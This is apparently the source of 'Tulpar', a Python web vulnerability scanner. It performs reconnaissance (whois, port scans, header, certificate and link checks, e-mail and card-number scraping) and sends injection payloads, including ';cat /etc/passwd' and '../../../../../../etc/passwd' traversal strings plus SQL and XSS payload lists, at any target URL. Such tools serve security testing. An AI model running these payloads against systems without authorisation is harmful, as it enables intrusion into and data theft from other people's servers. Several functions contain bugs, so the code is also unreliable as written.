import argparse
import regex as re
import requests
import whois 
import ssl
import socket
from lxml import html
from urllib.parse import urlparse, urlunparse, urlencode
from bs4 import *

desc = "Tulpar - Web Vulnerability Scanner"
parser = argparse.ArgumentParser(description=desc)
parser.add_argument("action", help="Action: full xss sql fuzzing e-mail credit-card whois links portscanner urlEncode cyberthreatintelligence commandInjection directoryTraversal fileInclude headerCheck certificate method IP2Location FileInputAvailable")
parser.add_argument("web_URL", help="URL")
args = parser.parse_args()
url = ""


def whoisSorgu(url, dosyaAdi):
    query = whois.whois(url)
    print("[+]Domain: ", query.domain)
    print("[+]Update time: ", query.get('updated_date'))
    print("[+]Expiration time: ", query.get('expiration_date'))
    print("[+]Name server: ", query.get('name_servers'))
    print("[+]Email: ", query.get('emails'))
    rapor = open(dosyaAdi, "a")
    raporIcerik = ""
    raporIcerik += "[+]Domain: " + query.domain + "\n"
    raporIcerik += "[+]Update time: " + str(query.get('updated_date')) + "\n"
    raporIcerik += "[+]Expiration time: " + str(query.get('expiration_date')) + "\n"
    raporIcerik += "[+]Name server: " + str(query.get('name_servers')) + "\n"
    raporIcerik += "[+]Email: " + str(query.get('emails')) + "\n"
    rapor.write(raporIcerik)
    rapor.close()


def commandInjection(url, dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + ";cat%20/etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print("[+]Command injection possible, payload: ;cat%20/etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Command injection possible, payload: ;cat%20/etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print("[-]Command injection isn't possible, payload: ;cat%20/etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[-]Command injection isn't possible, payload: ;cat%20/etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass


def directoryTraversal(url, dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + "../../../../../../etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print("[+]Directory traversal possible, payload: ../../../../../../etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Directory traversal possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print("[-]Directory traversal isn't possible, payload: ../../../../../../etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[-]Directory traversal isn't possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass


def fileInclude(url, dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + "../../../../../../etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print("[+]File include possible, payload: ../../../../../../etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]File include possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print("[-]File include isn't possible, payload: ../../../../../../etc/passwd")
            print("Response: ", sonuc.content)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[-]File include isn't possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass


def headerInformation(url, dosyaAdi):
    try:
        sonuc = requests.get(url, verify=False)
        raporIcerik = ""

        # Access headers safely using .get()
        server = sonuc.headers.get('Server')
        x_powered_by = sonuc.headers.get('X-Powered-By')
        x_content_type = sonuc.headers.get('X-Content-Type-Options')
        x_xss_protection = sonuc.headers.get('X-XSS-Protection')

        # Check for 'Server' header
        if server:
            print("[+]Server: ", server)
            raporIcerik += "[+]Server: " + server + "\n"
        else:
            print("[-]Server header is not present")
            raporIcerik += "[-]Server header is not present\n"

        # Check for 'X-Powered-By' header
        if x_powered_by:
            print("[+]Technology: ", x_powered_by)
            raporIcerik += "[+]Technology: " + x_powered_by + "\n"
        else:
            print("[-]X-Powered-By header is not present")
            raporIcerik += "[-]X-Powered-By header is not present\n"

        # Check for 'X-Content-Type-Options' header
        if x_content_type:
            print("[+]X-Content-Type available")
            raporIcerik += "[+]X-Content-Type available\n"
            if "nosniff" in x_content_type.lower():
                print("[+]X-Content-Type is secure")
                raporIcerik += "[+]X-Content-Type is secure\n"
            else:
                print("[-]X-Content-Type is not secure")
                raporIcerik += "[-]X-Content-Type is not secure\n"
        else:
            print("[-]X-Content-Type header isn't available")
            raporIcerik += "[-]X-Content-Type header isn't available\n"

        # Check for 'X-XSS-Protection' header
        if x_xss_protection:
            if x_xss_protection == "0":
                print("[+]No XSS protection")
                raporIcerik += "[+]No XSS protection\n"
            elif x_xss_protection == "1":
                print("[-]XSS protection possible")
                raporIcerik += "[-]XSS protection possible\n"
            else:
                print("[-]X-XSS-Protection header value is unknown")
                raporIcerik += "[-]X-XSS-Protection header value is unknown\n"
        else:
            print("[-]X-XSS-Protection header is not present")
            raporIcerik += "[-]X-XSS-Protection header is not present\n"

        # Write results to file
        with open(dosyaAdi, "a") as rapor:
            rapor.write(raporIcerik)

    except requests.RequestException as e:
        print(f"An error occurred during the request: {e}")


def portScanner(url, dosyaAdi):
    raporIcerik = ""
    baslangic = int(input("Start port: "))
    bitis = int(input("Finish port: "))

    # Parse the URL and extract the hostname
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    if not hostname:
        print("Invalid URL. Unable to resolve hostname.")
        return

    for port in range(baslangic, bitis + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Set a timeout for the connection attempt
        
        try:
            result = s.connect_ex((hostname, port))
            if result == 0:
                # Port is open
                print(f"[+] {port} - Open")
                raporIcerik += f"[+] {port} - Open\n"
            else:
                # Port is closed
                print(f"[-] {port} - Closed")
            s.close()
        except socket.error as e:
            print(f"Error on port {port}: {e}")
            raporIcerik += f"Error on port {port}: {e}\n"
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            raporIcerik += f"An unexpected error occurred on port {port}: {e}\n"

    # Write results to file
    with open(dosyaAdi, "a") as rapor:
        rapor.write(raporIcerik)


def robotstxtAvailable(url, dosyaAdi):
    url += "/robots.txt"
    try:
        sonuc = requests.get(url, verify=False)
        if int(sonuc.status_code) == 200:
            print("[+]robots.txt available")
            print("robots.txt:", sonuc.content)
            raporIcerik = "[+]robots.txt available\n"
            raporIcerik += "robots.txt:" + sonuc.content + "\n"
            rapor = open(dosyaAdi, "a")
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print("[-]robots.txt isn't available")
        print("robots.txt:", sonuc.content)
        raporIcerik = "[-]robots.txt isn't available\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()


def urlEncode(url, dosyaAdi):
    sozluk = {" ": "%20", "!": "%21", "#": "%23", "$": "%24", "%": "%25", "&": "%26", "'": "%27", "(": "%28",
              ")": "%29", "*": "%30", "+": "%2B", ",": "%2C",
              "-": "%2D", ".": "%2E", "/": "%2F", "0": "%30", "1": "%31", "2": "%32", "3": "%33", "4": "%34",
              "5": "%35", "6": "%36", "7": "%37", "8": "%38",
              "9": "%39", ":": "%3A", ";": "%3B", "<": "%3C", "=": "%3D", ">": "%3E", "?": "%3F", "@": "%40",
              "A": "%41", "B": "%42", "C": "%43", "D": "%44",
              "E": "%45", "F": "%46", "G": "%47", "H": "%48", "I": "%49", "J": "%4A", "K": "%4B", "L": "%4C",
              "M": "%4D", "N": "%4E", "O": "%4F", "P": "%50",
              "Q": "%51", "R": "%52", "S": "%53", "T": "%54", "U": "%55", "V": "%56", "W": "%57", "X": "%58",
              "Y": "%59", "Z": "%5A", "[": "%5B", "]": "%5D",
              "^": "%5E", "_": "%5F", "`": "%60", "a": "%61", "b": "%62", "c": "%63", "d": "%64", "e": "%65",
              "f": "%66", "g": "%67", "h": "%68", "i": "%69",
              "j": "%6A", "k": "%6B", "l": "%6C", "m": "%6D", "n": "%6E", "o": "%6F", "p": "%70", "q": "%71",
              "r": "%72", "s": "%73", "t": "%74", "u": "%75",
              "v": "%76", "w": "%77", "y": "%78", "z": "%7A", "{": "%7B", "|": "%7C", "}": "%7D", "~": "%7E"}
    encodeURL = ""
    for i in url:
        encodeURL += sozluk[i]
    print("[+]Encoded URL:", encodeURL)
    raporIcerik = "[+]Encoded URL:" + encodeURL + "\n"
    rapor = open(dosyaAdi, "a")
    rapor.write(raporIcerik)
    rapor.close()


def certificateInformation(url, dosyaAdi):
    try:
        # Parse the URL to extract the hostname
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        
        if not hostname:
            raise ValueError("Invalid URL or missing hostname.")
        
        print(f"Attempting to connect to hostname: {hostname}")

        # Create a default SSL context
        context = ssl.create_default_context()

        # Create a socket and wrap it with SSL
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                # Get the certificate
                certificate = ssock.getpeercert()
        
        # Extract relevant information from the certificate
        serial_number = certificate.get('serialNumber', 'Not available')
        version = certificate.get('version', 'Not available')

        # Print and log certificate details
        print("[+]Certificate Serial Number: ", serial_number)
        print("[+]Certificate SSL Version:", version)
        print("[+]Certificate:", certificate)
        
        raporIcerik = (
            f"[+]Certificate Serial Number: {serial_number}\n"
            f"[+]Certificate SSL Version: {version}\n"
            f"[+]Certificate: {certificate}\n"
        )

        with open(dosyaAdi, "a") as rapor:
            rapor.write(raporIcerik)
    
    except ValueError as e:
        print(f"ValueError: {e}")
    except socket.gaierror as e:
        print(f"DNS resolution error: {e}")
    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

# def cyberthreatintelligence(url,dosyaAdi):
    # cyberthreat.cyberThreatIntelligence(url, dosyaAdi)


def method(url, dosyaAdi):
    try:
        # Parse the URL to extract the hostname
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        
        if not hostname:
            raise ValueError("Invalid URL or missing hostname.")
        
        # Create a socket object
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set a timeout for the connection attempt
            s.settimeout(5)  # Adjust the timeout as needed

            # Connect to the specified host and port
            s.connect((hostname, 80))
            
            # Prepare and send the HTTP OPTIONS request
            request = "OPTIONS / HTTP/1.1\r\n"
            request += f"Host: {hostname}\r\n"
            request += "Connection: close\r\n\r\n"
            s.sendall(request.encode('utf-8'))
            
            # Receive the response
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk

            # Decode the response
            response = response.decode('utf-8')
            
            # Extract the allowed methods
            start_index = response.find("Allow:")
            if start_index != -1:
                end_index = response.find("\r\n", start_index)
                methods = response[start_index:end_index].strip()
                print("Methods: ", methods)
                raporIcerik = "[+]Methods: " + methods + "\n"
            else:
                methods = "Not found"
                print("Methods: ", methods)
                raporIcerik = "[-]Methods: Not found\n"
            
            # Write the results to the file
            with open(dosyaAdi, "a") as rapor:
                rapor.write(raporIcerik)

    except ValueError as e:
        print(f"ValueError: {e}")
        with open(dosyaAdi, "a") as rapor:
            rapor.write(f"ValueError: {e}\n")
    except socket.gaierror as e:
        print(f"DNS resolution error: {e}")
        with open(dosyaAdi, "a") as rapor:
            rapor.write(f"DNS resolution error: {e}\n")
    except socket.error as e:
        print(f"Socket error: {e}")
        with open(dosyaAdi, "a") as rapor:
            rapor.write(f"Socket error: {e}\n")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        with open(dosyaAdi, "a") as rapor:
            rapor.write(f"An unexpected error occurred: {e}\n")


def IP2Location(url, dosyaAdi):
    adres = "http://ip-api.com/json/" + url
    try:
        sonuc = requests.get(adres, verify=False)
        print("City: ", sonuc.content['city'])
        print("Country: ", sonuc.content['country'])
        print("Time Zone: ", sonuc.content['timezone'])
        raporIcerik = "[+]City: " + sonuc.content['city'] + "\n"
        raporIcerik += "[+]Country: " + sonuc.content['country'] + "\n"
        raporIcerik += "[+]Time Zone: " + sonuc.content['timezone'] + "\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()
    except:
        pass


def FileInputAvailable(url, dosyaAdi):
    page = requests.get(url, verify=False)
    tree = html.fromstring(page.content)
    inputs = tree.xpath('//input[@name]')
    for inp in inputs:
        startPoint = int(str(inp).find("'")) + 1
        stopPoint = int(str(inp).find("'", startPoint))
        print(str(inp)[startPoint:stopPoint])
        if "type='file'" in inp:
            print("[+]File Upload Function available")
            rapor = open(dosyaAdi, "a")
            rapor.write("[+]File Upload Function available\n")
            rapor.close()


def sql(url, dosyaAdi):
    sqlDosya = open("sqlpayload.txt", "r")
    sqlPayload = sqlDosya.readlines()
    sqlDosya.close()
    if "=" in url:
        deger = str(url).find('=')
        for i in sqlPayload:
            try:
                i = i.split("\n")[0]
                yazi = str(url[0:deger + 1]) + str(i)
                sonuc = requests.get(yazi)
                if int(sonuc.status_code) == 200:
                    print("[+]Sqli paylaod: ", str(i))
                    print("[+]Sqli URL: ", yazi)
                    rapor = open(dosyaAdi, "a")
                    raporIcerik = "[+]Sqli paylaod: " + str(i) + "\n"
                    raporIcerik += "[+]Sqli URL: " + yazi + "\n"
                    rapor.write(raporIcerik)
                    rapor.close()
                else:
                    print("[-]Sqli paylaod: ", str(i))
                    print("[-]Sqli URL: ", yazi)
                    rapor = open(dosyaAdi, "a")
                    raporIcerik = "[-]Sqli paylaod: " + str(i) + "\n"
                    raporIcerik += "[-]Sqli URL: " + yazi + "\n"
                    rapor.write(raporIcerik)
                    rapor.close()
            except:
                pass
    else:
        print("[-]Sqli isn't available")
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Sqli isn't available\n"
        rapor.write(raporIcerik)
        rapor.close()


def xss(url, dosyaAdi):
    try:
        with open("xsspayload.txt", "r", encoding='utf-8') as xssDosya:
            xssPayload = [line.strip() for line in xssDosya.readlines()]
        
        parsed_url = urlparse(url)
        if '=' in parsed_url.query:
            for payload in xssPayload:
                try:
                    query_params = dict(urlparse.parse_qsl(parsed_url.query))
                    query_params[parsed_url.path.split('=')[0]] = payload
                    test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(query_params), parsed_url.fragment))
                    response = requests.get(test_url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if payload in soup.text:
                        print("[+]XSS payload: ", payload)
                        print("[+]XSS URL: ", test_url)
                        with open(dosyaAdi, "a") as rapor:
                            rapor.write(f"[+]XSS payload: {payload}\n")
                            rapor.write(f"[+]XSS URL: {test_url}\n")
                    else:
                        print("[-]XSS payload: ", payload)
                        print("[-]XSS URL: ", test_url)
                        with open(dosyaAdi, "a") as rapor:
                            rapor.write(f"[-]XSS payload: {payload}\n")
                            rapor.write(f"[-]XSS URL: {test_url}\n")
                except Exception as e:
                    print(f"An error occurred with payload {payload}: {e}")
        else:
            print("[-]XSS isn't available")
            with open(dosyaAdi, "a") as rapor:
                rapor.write("[-]XSS isn't available\n")
    except UnicodeDecodeError as e:
        print(f"Unicode decoding error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


import logging


def crawl(url, dosyaAdi):
    logging.basicConfig(filename='crawl.log', level=logging.INFO)

    try:
        with open("crawl.txt", "r") as crawlDosya:
            crawlIcerik = crawlDosya.readlines()
    except FileNotFoundError:
        logging.error("File 'crawl.txt' not found")
        return

    for i in crawlIcerik:
        try:
            i = i.strip()  # Remove newline character
            crawlSite = url + i
            response = requests.get(crawlSite, verify=True)
            response.raise_for_status()  # Raise an exception for 4xx or 5xx status codes
            logging.info(f"[+]Url: {crawlSite}")
            with open(dosyaAdi, "a") as rapor:
                rapor.write(f"[+]Url: {crawlSite}\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error crawling {crawlSite}: {e}")
            with open(dosyaAdi, "a") as rapor:
                rapor.write(f"[-]Url: {crawlSite}\n")
        except Exception as e:
            logging.error(f"Error crawling {crawlSite}: {e}")


def mail(url, dosyaAdi):
    try:
        # Make the GET request
        response = requests.get(url, verify=False)
        
        # Decode the content to a string
        content = response.content.decode('utf-8')
        
        # Find all email addresses in the content
        emails = re.findall(r'[\w.-]+@[\w.-]+\.\w+', content)
        
        # Print and write email addresses to the file
        with open(dosyaAdi, "a") as file:
            for email in emails:
                print("[+]E-mail: ", email)
                file.write(f"[+]E-mail: {email}\n")
    
    except Exception as e:
        print(f"An error occurred: {e}")


def credit(url, dosyaAdi):
    istek = requests.get(url, verify=False)
    icerik = str(istek).split()
    icerikSon = str("".join(icerik))
    AMEX = re.match(r"^3[47][0-9]{13}$", icerikSon)
    VISA = re.match(r"^4[0-9]{12}(?:[0-9]{3})?$", icerikSon)
    MASTERCARD = re.match(r"^5[1-5][0-9]{14}$", icerikSon)
    DISCOVER = re.match(r"^6(?:011|5[0-9]{2})[0-9]{12}$", icerikSon)
    try:
        if MASTERCARD.group():
            print("[+]Website has a Master Card!")
            print(MASTERCARD.group())
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a Master Card!\n"
            raporIcerik += MASTERCARD.group() + "\n"
            rapor.write(raporIcerik)
            rapor.close()

    except:
        print("[-]Website hasn't a Mastercard!")
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't MasterCard!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if VISA.group():
            print("[+]Website has a VISA card!")
            print(VISA.group())
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a VISA card!\n"
            raporIcerik += VISA.group() + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print("[-]Website hasn't a VISA card!")
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a VISA card!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if AMEX.group():
            print("[+]Website has a AMEX card!")
            print(AMEX.group())
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a AMEX card!\n"
            raporIcerik += AMEX.group() + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print("[-]Website hasn't a AMEX card!")
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a AMEX card!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if DISCOVER.group():
            print("[+]Website has a DISCOVER card!")
            print(DISCOVER.group())
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a DISCOVER card!\n"
            raporIcerik += DISCOVER.group() + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print("[-]Website hasn't a DISCOVER card!")
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a DISCOVER card!\n"
        rapor.write(raporIcerik)
        rapor.close()


def link(url, dosyaAdi):
    isimSayi1 = url.find(".")
    isim = url[isimSayi1 + 1:]
    isimSayi2 = isim.find(".")
    isim = isim[:isimSayi2]
    istek = requests.get(url, verify=False)
    sonuc = re.findall(
        r"""(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’])|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)\b/?(?!@)))""",
        istek.text)
    for i in sonuc:
        if isim in i:
            print("[+]Links:", i)
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Links:" + i + "\n"
            rapor.write(raporIcerik)
            rapor.close()


if args:
    url = getattr(args, 'web_URL')
    print(str(url).split("/")[2])
    dosyaAdi = str(url).split("/")[2] + "_report.txt"
    rapor = open(dosyaAdi, "a")
    raporIcerik = url + "\n"
    rapor.write(raporIcerik)
    rapor.close()
    print("[+]URL:", url, "\n==========")
    if args.action == "sql":
        sql(url, dosyaAdi)

    elif args.action == "whois":
        whoisSorgu(url, dosyaAdi)

    elif args.action == "portscanner":
        if str(url).split("/")[2]:
            url = str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]

        print(url)
        portScanner(url, dosyaAdi)

    elif args.action == "urlEncode":
        urlEncode(url, dosyaAdi)

    # elif args.action=="cyberthreatintelligence":
        # cyberthreatintelligence(url,dosyaAdi)

    elif args.action == "xss":
        xss(url, dosyaAdi)

    elif args.action == "crawl":
        crawl(url, dosyaAdi)

    elif args.action == "e-mail":
        mail(url, dosyaAdi)

    elif args.action == "credit":
        credit(url, dosyaAdi)

    elif args.action == "links":
        link(url, dosyaAdi)

    elif args.action == "commandInjection":
        commandInjection(url, dosyaAdi)

    elif args.action == "directoryTraversal":
        directoryTraversal(url, dosyaAdi)

    elif args.action == "fileInclude":
        fileInclude(url, dosyaAdi)

    elif args.action == "headerCheck":
        headerInformation(url, dosyaAdi)

    elif args.action == "certificate":
        if str(url).split("/")[2]:
            url = str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]

        print(url)
        certificateInformation(url, dosyaAdi)

    elif args.action == "method":
        if str(url).split("/")[2]:
            url = str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]
        print(url)
        method(url, dosyaAdi)

    elif args.action == "IP2Location":
        IP2Location(url, dosyaAdi)

    elif args.action == "FileInputAvailable":
        FileInputAvailable(url, dosyaAdi)

    elif args.action == "full":
        whoisSorgu(url, dosyaAdi)
        urlEncode(url, dosyaAdi)
        method(url, dosyaAdi)
        certificateInformation(url, dosyaAdi)
        link(url, dosyaAdi)
        crawl(url, dosyaAdi)
        robotstxtAvailable(url, dosyaAdi)
        headerInformation(url, dosyaAdi)
        portScanner(url, dosyaAdi)
        mail(url, dosyaAdi)
        # webcyberthreatintelligence(url, dosyaAdi)
        IP2Location(url, dosyaAdi)
        FileInputAvailable(url, dosyaAdi)
        credit(url, dosyaAdi)
        sql(url, dosyaAdi)
        xss(url, dosyaAdi)
        commandInjection(url, dosyaAdi)
        directoryTraversal(url, dosyaAdi)
        fileInclude(url, dosyaAdi)
    else:
        exit()
